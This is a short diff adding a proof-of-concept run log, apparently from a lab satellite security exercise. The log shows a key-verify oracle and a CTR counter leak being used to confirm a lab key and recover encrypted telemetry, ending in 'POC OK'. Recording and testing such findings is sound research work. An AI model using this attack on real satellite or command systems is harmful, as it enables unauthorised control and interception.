@@ -1,0 +1,17 @@
+[   0.000] ========================================================================
+[   0.000] V-11 key-verify oracle + CTR counter leak
+[   0.000] ========================================================================
+[   0.000] --> TC apid=0x17 via=radio AES  payload=0000000007000102030405060708090a0b0c0d0e0f
+[   0.001] <-- TM apid=0x17 clear len=19
+[   0.001] KEY_VERIFY(kid=0) -> 1c09e13190faa25d60cee92b25e86adb
+[   0.001] local ctr_xor(candidate='PWNsatLabKey1234') -> 1c09e13190faa25d60cee92b25e86adb
+[   0.001] --> TC apid=0x17 via=radio AES  payload=2c00000007000102030405060708090a0b0c0d0e0f
+[   0.001] <-- TM apid=0x17 clear len=19
+[   0.001] --> TC apid=0x25 via=usb AES  payload=00a0
+[   0.002] <-- TM apid=0x25 clear len=4
+[   0.002] captured TM seq=5 -> recovered payload 01011f1f120a0a080000 (mode=0x01)
+[   0.002] --> TC apid=0x25 via=usb AES  payload=0080
+[   0.002] <-- TM apid=0x25 clear len=4
+[   0.002] ========================================================================
+[   0.002] POC OK
+[   0.002] ========================================================================
